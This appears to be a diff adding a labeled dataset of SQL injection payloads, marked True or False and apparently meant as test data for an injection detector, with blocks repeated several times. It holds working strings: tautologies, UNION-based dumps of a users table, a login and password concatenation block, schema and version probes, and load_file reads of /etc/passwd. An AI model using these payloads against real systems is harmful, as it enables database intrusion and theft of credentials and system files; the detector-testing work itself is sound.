+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+" or 1='1-- - True
+" or 1=1--/* - False
+", or 1=1-- - False
+", or 1=1-- - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+ or 1=1 /* - False
+' or =1 /* - True
+' or 1=1  - True
+' or 1=1  - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+oror-- 1=11111111--1 - False
+or =1-- - False
+or 11 - False
+or 11 - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
